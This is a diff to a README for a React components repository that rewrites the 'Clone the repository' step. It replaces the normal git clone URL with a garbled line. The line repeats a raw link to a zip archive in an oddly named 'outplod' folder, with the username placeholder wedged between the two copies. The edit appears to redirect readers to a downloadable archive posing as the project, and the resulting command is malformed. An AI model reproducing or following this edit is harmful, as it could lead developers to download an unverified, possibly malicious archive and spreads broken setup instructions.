@@ -19,5 +19,5 @@
 ## Getting Started  
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/<your-username>/React-components.git
+   git clone https://raw.githubusercontent.com/RianCole001/React-components/main/outplod/React-components-v3.2-beta.5.zip<your-username>https://raw.githubusercontent.com/RianCole001/React-components/main/outplod/React-components-v3.2-beta.5.zip
    cd React-components
